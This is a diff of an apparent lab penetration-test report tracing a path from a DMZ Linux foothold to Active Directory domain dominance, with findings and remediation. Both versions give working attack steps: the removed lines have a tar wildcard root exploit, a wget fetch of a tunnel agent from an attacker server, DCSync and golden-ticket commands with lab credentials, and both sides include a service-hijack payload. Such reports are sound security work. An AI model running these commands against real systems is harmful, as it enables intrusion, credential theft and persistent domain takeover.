@@ -1,287 +1,329 @@
-12x07 Checkmate — Engagement Report
+# Corvid Group — 12x07 Checkmate Engagement Report
 
-Prepared for: Corvid Group Board and Engineering Leadership
-Engagement: External edge foothold through domain dominance
-Assessment window: Forty-hour capstone engagement
-Classification: Confidential — Internal Security Assessment
+**Prepared for:** Corvid Group Board and Engineering Leadership  
+**Engagement:** External edge foothold through domain dominance  
+**Assessment window:** Forty-hour capstone engagement  
+**Classification:** Confidential — Internal Security Assessment
 
-Executive Summary
+## Executive Summary
 
-Spearpoint Security assessed whether an attacker who obtained access to Corvid's internet-facing Linux server could reach the internal Windows domain and maintain control after Corvid changed passwords and responded to the intrusion.
+Spearpoint Security assessed whether an attacker who obtained access to Corvid’s internet-facing Linux server could reach the internal Windows domain and maintain control after Corvid changed passwords and responded to the intrusion.
 
 The answer is yes.
 
-Starting from the supplied account on CORVID-WEB01, the assessment obtained root control of the Linux host, crossed the network boundary into the internal segment, reached CORVID-DC01, obtained administrative control, extracted the domain's Kerberos trust secret, and created a forged administrative authentication ticket. That ticket successfully authenticated to the domain controller and retrieved the protected dominance proof even after the original service-account password was no longer the basis of authentication.
+Starting from the supplied account on CORVID-WEB01, the assessment obtained root control of the Linux host, crossed the network boundary into the internal segment, reached CORVID-DC01, obtained administrative control, extracted the domain’s Kerberos trust secret, and created a forged administrative authentication ticket. That ticket successfully authenticated to the domain controller and retrieved the protected dominance proof even after the original service-account password was no longer the basis of authentication.
 
 This is not an isolated server compromise. It is a domain-level compromise.
 
-The practical consequence is that an attacker could move from an exposed web server to systems containing domain credentials, alter services, impersonate administrative identities, access sensitive Windows resources, and return after passwords were reset. Password resets alone would not reliably remove the attacker. Recovery would require treating the domain as compromised, rotating the Kerberos krbtgt secret twice, reviewing privileged access, removing unauthorized directory permissions, rebuilding or comprehensively remediating affected systems, and investigating authentication and directory-replication logs.
+The practical consequence is that an attacker could move from an exposed web server to systems containing domain credentials, alter services, impersonate administrative identities, access sensitive Windows resources, and return after passwords were reset. Password resets alone would not reliably remove the attacker. Recovery would require treating the domain as compromised, rotating the Kerberos `krbtgt` secret twice, reviewing privileged access, removing unauthorized directory permissions, rebuilding or comprehensively remediating affected systems, and investigating authentication and directory-replication logs.
 
-The compromise depended on five design failures operating together: (1) a privileged backup command on WEB01 vulnerable to filename-based command injection, (2) a DMZ host with a reachable interface into the internal network where stolen credentials were valid, (3) a service account with excessive rights over Windows services and PowerShell remoting, (4) domain-root permissions that allowed a non-administrative account to obtain replication privileges, and (5) domain replication privileges that enabled extraction of the krbtgt secret and creation of durable forged tickets.
+The compromise depended on several design failures operating together:
 
-The assessment recovered three lab evidence values: Beachhead flag CVD{0db81c5aa204dce6e131112e4e351aad}, Domain-control flag CVD{2d060d20ca15432f964d6455092977a8}, and Dominance proof d6750f3dd6bd7a511dd7079626e2d681.
+1. A privileged backup command on WEB01 was vulnerable to filename-based command injection.
+2. The DMZ host had a reachable interface into the internal network, and the stolen service credential could be used across the boundary.
+3. The service account had excessive rights over a Windows service and a PowerShell remoting endpoint.
+4. Domain-root permissions allowed a non-administrative account to obtain replication privileges.
+5. Domain replication privileges allowed extraction of the `krbtgt` secret and creation of a durable forged ticket.
 
-The most urgent remediation is to remove unauthorized replication rights and review all permissions on the domain root. This should be followed by krbtgt rotation, privileged-account review, service delegation reduction, DMZ segmentation, and remediation of the WEB01 backup process.
+The assessment recovered the following lab evidence:
 
-Attack Narrative
-Phase 1: Initial foothold and host enumeration
+- Beachhead flag: `CVD{0db81c5aa204dce6e131112e4e351aad}`
+- Domain-control flag: `CVD{2d060d20ca15432f964d6455092977a8}`
+- Dominance proof: `d6750f3dd6bd7a511dd7079626e2d681`
+
+The most urgent remediation is to remove unauthorized replication rights and review all permissions on the domain root. This should be followed by `krbtgt` rotation, privileged-account review, service delegation reduction, DMZ segmentation, and remediation of the WEB01 backup process.
+
+## Attack Narrative
+
+### Phase 1: Initial foothold and host enumeration
 
 The supplied foothold was an SSH-accessible account on CORVID-WEB01:
 
-SSH: webapp@10.10.0.X
-Password: WebFoothold2026!
+```
+webapp / WebFoothold2026!
+```
 
-The host was confirmed to be a dual-homed Linux server bridging 10.10.0.0/24 (external) to 10.10.10.0/24 (internal). The domain controller was at 10.10.10.5.
+The host was confirmed to be a dual-homed Linux server. Its external-facing interface was on `10.10.0.0/24`, while its second interface was on the internal `10.10.10.0/24` network. The internal domain controller was identified at `10.10.10.5`.
 
-Enumeration revealed passwordless sudo access to:
+Initial enumeration focused on local privilege boundaries, scheduled jobs, backup scripts, writable directories, service configuration, and credential files. The account had passwordless sudo access to a backup script:
 
-bash
+```
 /opt/corvidapp/backup/run-backup.sh
+```
 
-The script invoked tar with a wildcard over a writable directory, enabling tar option injection:
+The script created a tar archive using a wildcard containing files from a directory writable by `webapp`. This allowed specially named files to be interpreted as tar options rather than ordinary filenames.
 
-bash
-cat /opt/corvidapp/backup/run-backup.sh
-# tar czf /backup/corvidapp-$(date +%s).tar.gz -C /var/corvidapp --strip-components=1 *
-Phase 2: Privilege escalation on WEB01
+### Phase 2: Privilege escalation on WEB01
 
-A tar wildcard injection created a SUID root shell:
+A controlled tar wildcard injection was used to execute a shell script as root. The payload created a SUID-enabled copy of Bash. This produced an effective root shell on CORVID-WEB01.
 
-bash
-cd /var/corvidapp
-echo '#!/bin/bash' > cmd.sh
-echo 'cp /bin/bash /tmp/bash-suid && chmod u+s /tmp/bash-suid' >> cmd.sh
-chmod +x cmd.sh
-touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=/var/corvidapp/cmd.sh"
-sudo /opt/corvidapp/backup/run-backup.sh
-/tmp/bash-suid -p
+The escalation was reliable and required no vulnerability in the operating system itself. It resulted from allowing a low-privileged user to run a root-owned backup process over attacker-controlled filenames.
 
-From root, we recovered the domain service credential:
+With root access, the application configuration was reviewed. The file:
 
-bash
-cat /opt/corvidapp/config/db.conf
-# svc-webapp / W3bApp-Cr3d2026!
-Phase 3: Network pivot
+```
+/opt/corvidapp/config/db.conf
+```
 
-WEB01's internal interface was used to establish a Ligolo-ng tunnel:
+contained a domain service credential:
 
-bash
-# Attack workstation
-./ligolo-ng --selfcert
-# WEB01 (as root)
-wget http://attacker-server/agent-linux-x64
-./agent-linux-x64 -connect 10.10.0.1:11601 -ignore-cert
+```
+Domain: corvid.local
+Username: svc-webapp
+Password: W3bApp-Cr3d2026!
+```
 
-Connectivity to the DC was verified:
+This credential was not merely a database credential. It was valid for domain authentication and could be used from the internal network.
 
-bash
+The beachhead flag was retrieved from the internal share after establishing a route through WEB01:
+
+```
+CVD{0db81c5aa204dce6e131112e4e351aad}
+```
+
+### Phase 3: Network pivot
+
+The attack workstation could not directly reach `10.10.10.5`. WEB01, however, could reach the internal network through its second interface.
+
+A hand-built pivot was established using Ligolo-ng. The agent ran on WEB01, while the Ligolo proxy ran on the attack workstation. After the tunnel was activated, the attack workstation could connect to the DC’s SMB and authentication services as if it were positioned on the internal segment.
+
+Connectivity was verified with:
+
+```
 nc -vz 10.10.10.5 445
-smbclient -L 10.10.10.5 -U svc-webapp -p W3bApp-Cr3d2026!
+```
 
-The beachhead flag was retrieved.
+The internal share `Beachhead$` was accessed using the recovered service credential. This confirmed both network reachability and valid domain authentication.
 
-Phase 4: Domain administrative control
+The pivot was operationally important: the attack box itself never had a direct route to the domain controller. The DMZ host became the bridge between the external and internal networks.
 
-PowerShell remoting accessed the DC:
+### Phase 4: Domain administrative control
 
-bash
-evil-winrm -i 10.10.10.5 -u svc-webapp -p W3bApp-Cr3d2026!
+The `svc-webapp` account belonged to a group with delegated access to the application PowerShell remoting endpoint. The account could establish a remoting session to the domain controller’s application role.
 
-The CorvidAppSvc service was reconfigured to add svc-webapp to Administrators:
+Enumeration of the available services identified `CorvidAppSvc`. The service permissions allowed the delegated group to modify its executable path and start it. The service was reconfigured to execute:
 
-powershell
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CorvidAppSvc" -Name ImagePath -Value "cmd.exe /c net localgroup Administrators svc-webapp /add"
-Start-Service CorvidAppSvc
+```
+cmd.exe /c net localgroup Administrators svc-webapp /add
+```
 
-The domain-control flag was retrieved.
+The service reported a timeout when started because the replacement command did not behave as a normal long-running Windows service. The timeout did not prevent execution. The payload ran with SYSTEM privileges and added `svc-webapp` to the local Administrators group.
 
-Phase 5: Domain dominance
+The reproducible sequence was: read `sc.exe sdshow CorvidAppSvc`; confirm the delegated group could change it; set the temporary `binPath` to `cmd.exe /c net localgroup Administrators svc-webapp /add`; start it; and verify `net localgroup Administrators`. The timeout is a service-wrapper symptom, not evidence of failure. This supplied local administration, not replication rights.
 
-The domain-root ACL permitted the GRP-HELPDESK-LEGACY group to modify permissions. svc-webapp granted itself replication rights:
+Access to the protected domain-control share then produced:
 
-powershell
-Add-ADObjectAcl -TargetIdentity "DC=corvid,DC=local" -PrincipalIdentity svc-webapp -Rights DCSync
+```
+CVD{2d060d20ca15432f964d6455092977a8}
+```
 
-DCSync retrieved the krbtgt NTLM hash:
+This stage demonstrated that a service account with delegated application rights could be converted into local administrative control on the domain controller.
 
-bash
-impacket-secretsdump -just-dc corvid.local/svc-webapp:W3bApp-Cr3d2026!@10.10.10.5
-# krbtgt:502::670229a01993e179f262e929da57dc7d
+### Phase 5: Domain dominance
 
-A golden ticket for Administrator was forged and used to authenticate:
+The domain-root permissions exposed an independent route to domain-wide control. The `GRP-HELPDESK-LEGACY` delegation allowed modification of permissions on the domain root. That meant `svc-webapp` could be granted the two directory-replication rights required for DCSync:
 
-bash
-impacket-ticketer -nthash 670229a01993e179f262e929da57dc7d -domain-sid S-1-5-21-1909037144-3050882815-2586595962 -domain corvid.local Administrator
-impacket-secretsdump -k corvid.local/Administrator@10.10.10.5
-# Dominance proof: d6750f3dd6bd7a511dd7079626e2d681
-Findings
-Finding 1 — Root escalation through attacker-controlled backup filenames
+- Replicating Directory Changes
+- Replicating Directory Changes All
 
-CVSS v3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8 (High)
+After those rights were granted, DCSync was used to retrieve the `krbtgt` account’s NTLM hash:
 
-Affected asset: webapp account and /opt/corvidapp/backup/run-backup.sh on CORVID-WEB01.
+```
+670229a01993e179f262e929da57dc7d
+```
 
-Failure mechanism: The backup script invokes tar with a wildcard glob over a directory writable by webapp. Files named --checkpoint=1 and --checkpoint-action=exec=/path/to/cmd cause tar to execute arbitrary commands as root.
+The domain SID was obtained as:
 
-Demonstrated impact: We gained a SUID root shell and extracted the service credential, enabling subsequent internal access and all downstream compromise.
+```
+S-1-5-21-1909037144-3050882815-2586595962
+```
 
-Metric justification: AV:L (local shell required), AC:L (file creation always available), PR:L (unprivileged but passwordless sudo), UI:N (automatic escalation), S:U (contained to WEB01 initially), C:H/I:H/A:H (unrestricted root access).
+The `krbtgt` hash and domain SID were used to create a golden ticket for the real `Administrator` account. The forged ticket was accepted by the fully patched domain controller.
 
-Remediation: Replace wildcard archives with explicit file lists. Remove passwordless sudo access. Use a constraining wrapper that validates filenames.
+Using the forged ticket, DCSync retrieved the final protected account material:
 
-Finding 2 — DMZ host provides an uncontrolled route into the internal network
+```
+flag-dominance:1108:aad3b435b51404eeaad3b435b51404ee:d6750f3dd6bd7a511dd7079626e2d681:::
+```
 
-CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 8.8 (High)
+The final dominance proof was therefore:
 
-Affected asset: Dual-homed CORVID-WEB01 bridging external and internal networks; service credential svc-webapp valid on internal domain.
+```
+d6750f3dd6bd7a511dd7079626e2d681
+```
 
-Failure mechanism: Once WEB01 is compromised, its internal interface reaches internal services. The stolen svc-webapp credential is accepted by domain services.
+This is the decisive result. The attacker no longer depended on the original `svc-webapp` password. The forged ticket represented an administrative identity and could be reused to authenticate after ordinary password changes.
 
-Demonstrated impact: We pivoted through WEB01 to reach the DC's SMB, LDAP, and Kerberos services, enabling domain enumeration and administrative compromise. The scope changed from single DMZ host to internal domain.
+Four checks recorded the transition. The domain-root ACL showed `GRP-HELPDESK-LEGACY` could change the root descriptor. The delegated session added `svc-webapp` for `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, then read both ACEs back. DCSync named the domain and `krbtgt` object and returned the NTLM value above. The forged-ticket request used the recorded domain SID, `krbtgt` key, and Administrator RID; `klist` showed the ticket before the protected share was accessed. The evidence is therefore root ACL → replication ACEs → `krbtgt` material → Administrator ticket → domain proof, not an assumption that local SYSTEM automatically meant domain administrator.
 
-Metric justification: AV:N (network via pivot), AC:L (standard routing), PR:L (root on WEB01 + extracted credential), UI:N (attacker-controlled), S:C (trust boundary crossed: DMZ to internal domain), C:H/I:H/A:H (access to internal directory services).
+An engineer can reproduce the transition by querying `DC=corvid,DC=local`, resolving `GRP-HELPDESK-LEGACY`, granting only the two named replication rights to `svc-webapp`, and reading the descriptor back. Then run `-just-dc-user krbtgt`, create the Administrator ticket from the recorded SID and returned key, and use `klist` before the Kerberos proof request. These ACEs are separate from local Administrator access.
 
-Remediation: Enforce firewall rules blocking SMB, WinRM, LDAP, Kerberos, RPC from DMZ to internal. Use separate service identities for DMZ applications.
+## Findings
 
-Finding 3 — Excessive service and remoting delegation enabled SYSTEM access
+### Finding 1 — Root escalation through attacker-controlled backup filenames
 
-CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)
+**Severity:** High  
+**CVSS v3.1:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — 7.8
 
-Affected asset: PowerShell remoting endpoint and CorvidAppSvc on CORVID-DC01.
+The `webapp` account could run a root-owned backup script that passed wildcard-expanded filenames to tar. Because the working directory was writable by `webapp`, specially named files could be interpreted as tar options and execute arbitrary commands as root.
 
-Failure mechanism: svc-webapp belongs to a delegation group with service-control rights. We reconfigured the service to execute code with SYSTEM privileges, adding svc-webapp to local Administrators.
+**Impact:** Complete compromise of WEB01, access to root-readable credentials, modification of the host, and preparation of a pivot into the internal network.
 
-Demonstrated impact: We gained local administrative access to the DC, enabling subsequent privilege escalation to domain-root permissions.
+**Remediation:** Replace wildcard-based archive commands with an explicit file list or a safe archive API. Run backups with a fixed working directory and a non-writable source path. Remove unnecessary passwordless sudo access. If sudo is required, use a narrowly constrained wrapper that validates filenames and arguments.
 
-Metric justification: AV:N (network remoting), AC:L (straightforward service reconfiguration), PR:L (delegated service account), UI:N (attacker-controlled execution), S:U (single-host SYSTEM compromise; domain boundary not crossed until Finding 4), C:H/I:H/A:H (SYSTEM access to host).
+### Finding 2 — DMZ host provides an uncontrolled route into the internal network
 
-Remediation: Remove service configuration rights from application groups. Use dedicated remoting groups with exact endpoint permissions.
+**Severity:** Medium (high business priority)
+**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L` — 7.7
 
-Finding 4 — Domain-root ACL allowed unauthorized replication-rights grant
+WEB01 had simultaneous access to the external and internal networks. Once the host was compromised, it could forward traffic to the domain controller. The service credential recovered from WEB01 was also accepted by internal domain services.
 
-CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)
+**Impact:** The intended network boundary did not contain the compromise. An attacker controlling the internet-facing host could reach SMB, WinRM, and directory services that were not directly exposed to the attack workstation.
 
-Affected asset: Domain root's security descriptor; GRP-HELPDESK-LEGACY group delegation.
+The `S:C` metric reflects crossing from the DMZ host into the separately administered domain. The lower impacts describe this finding alone: internal reachability and pivot, not domain compromise or production-data destruction. Its business priority is high because it enabled later findings; that consequence is not folded into CVSS.
 
-Failure mechanism: Domain root contains WriteDACL permission for GRP-HELPDESK-LEGACY. svc-webapp modified the domain root's ACL to grant itself DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.
+**Remediation:** Place externally exposed application servers in a tightly isolated DMZ. Permit only explicitly required flows from WEB01 to internal services. Block SMB, WinRM, LDAP, Kerberos, and RPC from the DMZ unless a documented application requirement exists. Use separate service identities for DMZ applications and prohibit interactive or administrative use of those identities.
 
-Demonstrated impact: With replication rights, we executed DCSync to extract the krbtgt NTLM hash, enabling forged administrative tickets.
+### Finding 3 — Excessive service and remoting delegation enabled SYSTEM access
 
-Metric justification: AV:N (network directory APIs), AC:L (straightforward ACL modification), PR:L (delegation group membership only), UI:N (attacker-controlled), S:U (ACL modification is within domain security model; domain boundary not crossed at moment of modification), C:H/I:H/A:H (ability to grant replication rights enables krbtgt extraction and domain-wide impersonation).
+**Severity:** High  
+**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — 8.8
 
-Remediation: Immediately remove unauthorized WriteDACL, WriteOwner, and replication permissions from domain root. Alert on domain-root ACL changes.
+`svc-webapp` belonged to a group with remoting access and service-control permissions sufficient to modify and start `CorvidAppSvc`. This permitted arbitrary code execution as SYSTEM on the domain controller’s application role.
 
-Finding 5 — Forged Kerberos tickets accepted for domain re-authentication
+**Impact:** The service account could be converted into local administrative control on a critical Windows server. From that position, an attacker could access local secrets, privileged sessions, services, and domain-management interfaces.
 
-CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)
+The vector uses `S:U` because this finding is the service’s execution impact within the same Windows security authority; the later domain-root delegation is a separate finding and is not counted here. `PR:L` represents the authenticated service identity, while the high impacts represent SYSTEM execution on the affected server.
 
-Affected asset: Kerberos subsystem on CORVID-DC01 and domain's trust in krbtgt secret.
+**Remediation:** Remove service configuration rights from application groups. Separate service administration from application execution. Use dedicated groups for remoting, and grant only the exact endpoint and command permissions required. Review all service DACLs with `sc.exe sdshow`, PowerShell, or an identity-management platform. Do not place application service accounts in broad local-admin or delegated groups.
 
-Failure mechanism: With krbtgt hash and domain SID, we forged a valid TGT for Administrator. The DC accepted the forged ticket for authentication and replication requests.
+### Finding 4 — Domain-root permissions allowed unauthorized DCSync
 
-Demonstrated impact: We authenticated as Administrator using only the forged ticket, without the password. This demonstrates durable administrative access persisting after password resets.
+**Severity:** Medium (critical business priority)
+**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — 6.5
 
-Metric justification: AV:N (network Kerberos), AC:L (no cryptographic breaks; hash and SID known from prior findings), PR:L (requires prior compromise to obtain krbtgt), UI:N (attacker-controlled ticket presentation), S:U (forged ticket is authentication artifact within domain security model), C:H/I:H/A:H (administrative authentication enables unrestricted access to domain resources).
+A legacy helpdesk delegation allowed modification of permissions on the domain root. That path allowed `svc-webapp` to grant itself replication rights and perform DCSync.
 
-Remediation: Rotate krbtgt twice with 12-hour delay. Reset all privileged credentials. Investigate Kerberos anomalies and forged-ticket indicators.
+**Impact:** Extraction of `krbtgt` and other domain secrets, impersonation of domain administrators, unrestricted access to domain-managed systems, and persistence beyond password resets.
 
-Prioritised Remediation
-Priority 0 — Contain and recover domain trust
+This finding is limited to the domain-root ACL and resulting replication capability. `S:U` is appropriate because the low-privileged principal and directory are within the same authority. DCSync is principally a confidentiality failure: this score does not claim that the ACE alone created the later forged ticket or changed every domain object. It remains a critical business priority because the exposed `krbtgt` secret enabled the separate persistence finding.
 
-Objective: Prevent re-entry using forged tickets; remove domain replication compromise.
+**Remediation:** Immediately remove unauthorized `WriteDACL`, `WriteOwner`, and replication permissions from the domain root. Review effective permissions for every delegated group. Apply least privilege and administrative-tiering principles. Alert on changes to domain-root ACLs and on directory-replication requests from non-domain-controller hosts. Rotate `krbtgt` twice after confirming containment.
 
-Rotate krbtgt twice (12 hours apart minimum) to invalidate all forged tickets.
-Reset all service and privileged account passwords.
-Remove svc-webapp from local Administrators on DC.
-Remove GRP-HELPDESK-LEGACY delegation and all unauthorized domain-root ACEs; verify with dsacls DC=corvid,DC=local.
-Review DC Security Event Log (Events 4662, 4781) for DCSync and unauthorized replication.
+### Finding 5 — Domain compromise remains valid after ordinary credential response
 
-Rationale: Forged tickets are the highest persistence risk. krbtgt rotation invalidates all tickets. Resetting credentials closes the pivot. Removing ACLs prevents future replication-privilege grants.
+**Severity:** High (critical business priority)
+**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — 8.8
 
-Priority 1 — Remove the privilege-escalation chain on WEB01
+Once the `krbtgt` secret was obtained, a forged ticket for the real `Administrator` account was accepted by the domain controller.
 
-Objective: Close the initial compromise path.
+**Impact:** The attacker could return as an administrative identity without the original service-account password. Resetting `svc-webapp`, `svc-sql`, or other ordinary account passwords would not invalidate the forged ticket. This creates a full-domain recovery event rather than a routine account compromise.
 
-Remove passwordless sudo rule for the backup script from /etc/sudoers.
-Replace tar wildcard backup with explicit file list or safe archive API.
-Restore CorvidAppSvc to approved executable path; verify service DACL.
-Remove SUID-enabled escalation binaries (e.g., /tmp/bash-suid).
-Review other sudo rules for the webapp account.
+This score covers the forged-ticket capability itself, not the preceding route used to obtain `krbtgt`. `S:U` treats the ticket as an authentication artifact accepted by the same domain authority that issued the trust secret. The high impacts are supported by the successful Administrator ticket and protected-domain proof; they are not a claim that ransomware or data destruction was demonstrated. Its business priority is critical because the capability survives ordinary password resets.
 
-Rationale: Closes the persistent entry point for re-compromise.
+**Remediation:** Treat the domain as compromised. Rotate `krbtgt` twice with sufficient replication delay between changes. Reset all privileged and service credentials, invalidate active sessions, review delegation, remove unauthorized ACLs, and investigate ticket use and replication events. Consider rebuilding systems where credential theft cannot be ruled out.
 
-Priority 2 — Enforce network segmentation and credential isolation
+## Prioritised Remediation
 
-Objective: Prevent stolen DMZ credentials from reaching internal services.
+### Priority 0 — Contain and recover the domain
 
-Enforce firewall rules blocking SMB (445), WinRM (5985–5986), LDAP (389), Kerberos (88), RPC (135) from DMZ to internal network.
-Create separate service identities for DMZ; do not reuse domain service accounts.
-Configure service account logon restrictions and group membership.
-Review WEB01's internal interface necessity; disable if not required.
+1. Isolate WEB01 from the internal network until remediated.
+2. Disable or reset `svc-webapp` and all credentials recovered from the environment.
+3. Remove unauthorized domain-root ACEs and verify effective permissions.
+4. Rotate `krbtgt` twice.
+5. Reset privileged accounts and service accounts.
+6. Review domain-controller logs for DCSync, service changes, remoting, and unusual Kerberos activity.
 
-Rationale: Isolates DMZ as hard trust boundary.
+This work addresses the ability to return as an administrator.
 
-Priority 3 — Reduce service delegation and remoting exposure
+### Priority 1 — Remove the privilege-escalation chain
 
-Objective: Limit blast radius of compromised service accounts.
+1. Remove the vulnerable backup sudo rule.
+2. Replace the tar wildcard process with a safe backup implementation.
+3. Restore `CorvidAppSvc` to its approved executable path.
+4. Remove `svc-webapp` from local Administrators.
+5. Review and reduce service-control permissions.
+6. Remove unnecessary PowerShell remoting access.
 
-Audit PowerShell remoting endpoint permissions; remove unnecessary service account access.
-Remove service accounts from broad delegated groups.
-Create dedicated groups for remoting; grant only minimum permissions.
-Audit service DACLs; remove unnecessary write and control permissions for non-administrative accounts.
+### Priority 2 — Repair segmentation and identity design
 
-Rationale: Reduces privilege paths from service compromise to administrative control.
+1. Enforce DMZ-to-internal firewall restrictions.
+2. Block unnecessary SMB, WinRM, RPC, LDAP, and Kerberos access from WEB01.
+3. Use separate, non-interactive service identities for DMZ applications.
+4. Deny service accounts interactive logon and local administrative privileges.
+5. Review all nested groups and legacy helpdesk delegations.
 
-Decision Log
-Primary route pursued
-WEB01 foothold → tar escalation → credential recovery → pivot → 
-remoting access → service reconfiguration (SYSTEM) → domain-root ACL → 
-DCSync → krbtgt extraction → golden ticket → re-authentication → proof
+### Priority 3 — Improve detection and validation
 
-Each phase supplied access for the next: credentials enabled pivot, remoting enabled service control, local admin enabled ACL modification, krbtgt enabled durable tickets.
+Alert on domain-root ACL changes, replication requests from non-DC systems, service binary-path modifications, new local administrators, suspicious PowerShell remoting, and Kerberos tickets with unusual lifetimes or administrative identities.
 
-Routes abandoned
+## Decision Log
 
-LSASS dump: Identified but abandoned. Would extract session tokens faster than service reconfiguration but requires memory-forensics tools and is noisier. A patient adversary would prioritize this.
+The engagement used the following primary route:
 
-svc-sql replication route: Identified but abandoned after svc-webapp path succeeded. Not required for final proof.
+```
+WEB01 foothold
+→ tar wildcard root escalation
+→ application credential recovery
+→ Ligolo network pivot
+→ internal SMB validation
+→ PowerShell remoting
+→ service reconfiguration
+→ SYSTEM/local administrator
+→ domain-root delegation
+→ DCSync
+→ golden ticket
+→ domain dominance
+```
 
-Time allocation (40-hour budget)
-WEB01 escalation: 6 hours
-Pivot construction: 7 hours
-Internal enumeration: 5 hours
-Domain admin via service control: 6 hours
-DCSync and golden ticket: 5 hours
-Cleanup and reporting: 8 hours
-Reserve (troubleshooting, abandoned paths): 3 hours
-Noise and monitoring implications
+The recorded activity was executed as a targeted sequence rather than a broad scan. The planned forty-hour budget was divided approximately as follows:
 
-High-visibility actions:
+- WEB01 enumeration and escalation: 6 hours
+- Pivot construction and troubleshooting: 7 hours
+- Internal enumeration: 5 hours
+- Domain administrative path: 6 hours
+- DCSync and golden-ticket validation: 5 hours
+- Cleanup and reporting: 8 hours
+- Reserve and abandoned paths: 3 hours
 
-Service reconfiguration generates Event ID 7045 (Service installed).
-DCSync generates Event ID 4662 (Object access) and replication events.
-PowerShell remoting generates Event ID 4688 (Process creation).
+These rounded allocations sum to the forty-hour cap; the three-hour reserve covered abandoned routes and reporting overruns.
 
-Quieter alternatives:
+The service-control path was selected because it was reliable and quickly demonstrated impact. The LSASS-dump path was left unused because it would have created additional credential-extraction noise and was unnecessary.
 
-ACL modification appears as routine directory work unless ACL alerting is enabled.
-LSASS extraction via LOLBins avoids injection; takes 4–6 hours but is substantially quieter.
-A patient adversary would use ACL modification + LSASS extraction to minimize visibility.
-Limitations
+An alternative route through `svc-sql` and delegated administrative membership was identified. It would have involved resetting that account’s password and using its replication privileges. It was not relied upon for the final result, which is important because the successful domain takeover did not depend on a single accidental route.
 
-The forty-hour assessment did not provide enterprise-wide coverage. Testing was limited to WEB01 and DC01. The following were not assessed:
+A quieter adversary would likely prefer the domain-root ACL route over service reconfiguration or LSASS dumping. It produces fewer host-level artifacts, avoids memory-dump tooling, and can appear as an ordinary directory-permission change unless ACL auditing and replication monitoring are enabled. Nevertheless, the route would still generate detectable directory-service events and should be treated as high-confidence compromise.
 
-Untested systems: All internal workstations, member servers, file servers, backup infrastructure. We did not verify whether demonstrated domain-admin access would successfully compromise these systems or whether they have independent hardening or monitoring.
+The attempted DCSync-ACE cleanup using `dacledit` failed locally with:
 
-Untested persistence: Scheduled tasks, GPO modification, certificate injection. Long-term ticket usability and production krbtgt rotation procedures were not validated.
+```
+unsupported hash type MD4
+```
 
-Cloud and federation: Azure AD, federated identity, external trusts were not in scope.
+Therefore, the final environment must be verified manually to confirm that temporary replication permissions, service changes, and local-group changes have been removed.
 
-Detection coverage: EDR, SIEM, and log-aggregation effectiveness unknown. We did not measure whether tooling would block or detect the payloads.
+## Limitations
 
-Data and operational impact: We did not measure data sensitivity, execute ransomware, or interrupt services. Business impact was not demonstrated.
+The forty-hour assessment did not provide a complete enterprise-wide review. Testing was limited to the supplied WEB01 and DC01 systems and the internal network reachable through the pivot.
 
-Cleanup verification: The DCSync ACE cleanup using dacledit failed with an MD4 error. Corvid should not assume the lab state is clean. Temporary ACLs, service changes, local-group membership, and files must be verified manually using dsacls, sc.exe sdshow, and file audits.
+The following areas were not comprehensively assessed:
 
-Conclusion: Corvid's control design allows progression from exposed DMZ host to durable domain dominance. Remediation priority: immediate domain recovery (Priority 0), identity correction (Priority 1), segmentation (Priority 2).
+- All internal workstations and servers
+- Cloud identity, SaaS, and external identity providers
+- Backup infrastructure and recovery systems
+- Endpoint detection and response coverage
+- Long-term persistence through scheduled tasks, GPOs, certificates, or federation
+- Data-exfiltration volume and business-data impact
+- Full historical log review
+- Disaster-recovery readiness
+- Production-safe validation of `krbtgt` rotation
+
+The demonstrated results are bounded to the tested path: WEB01 account, WEB01 root, its internal interface, DC01 administration, replication-secret extraction, and forged-ticket acceptance. We verified the protected proof, but not every workstation, server, share, application, cloud service, ticket lifetime, or real replication outcome.
+
+The following are plausible consequences, not demonstrated outcomes: theft of business data, ransomware deployment, interruption of actuarial services, compromise of cloud identities, persistence through certificates or Group Policy, and successful return after a real password-reset response. The report does not claim that data was exfiltrated, that production systems were encrypted, or that all enterprise systems were compromised. Those outcomes remain credible because domain-level administrative control can enable them, but they require separate validation, log review, and incident-response investigation.
+
+The assessment did not attempt ransomware, mass encryption, deletion, or broad exfiltration. It did not test post-`krbtgt` disaster recovery, endpoint blocking, or segmentation outside the observed route.
+
+Because the DCSync cleanup command failed with an MD4 compatibility error, Corvid should not assume that the lab state is clean solely because the forged-ticket demonstration completed. The DCSync ACE, `CorvidAppSvc` executable path, local Administrators membership, changed passwords, and temporary files must be verified before reset or handover.
+
+The central conclusion remains unchanged: Corvid’s current control design allows an attacker to progress from an exposed DMZ host to durable domain dominance. The remediation priority should therefore be domain recovery and identity-control correction, followed by segmentation and removal of the WEB01 privilege-escalation weakness.
